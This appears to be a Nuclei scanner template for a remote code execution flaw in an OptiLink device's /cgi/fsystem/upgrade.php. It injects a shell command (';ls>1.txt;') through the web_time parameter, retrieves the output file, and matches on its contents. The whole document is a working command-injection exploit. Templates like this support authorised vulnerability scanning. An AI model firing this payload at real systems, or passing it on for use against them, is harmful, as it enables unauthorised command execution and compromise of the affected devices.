id: optilink-upgrade-rce

info:
  name: OptiLink Upgrade - Remote Code Execution
  author: HuanXiong
  severity: Critical

  tags: RCE

http:
  - raw:
      - |
        GET /cgi/fsystem/upgrade.php?time=1&web_time=;ls>1.txt; HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

      - |
        GET /cgi/fsystem/1.txt HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

    matchers:
      - type: dsl
        name: RCE
        dsl:
          - "status_code_2 == 200 && contains(body_2, '.php')"
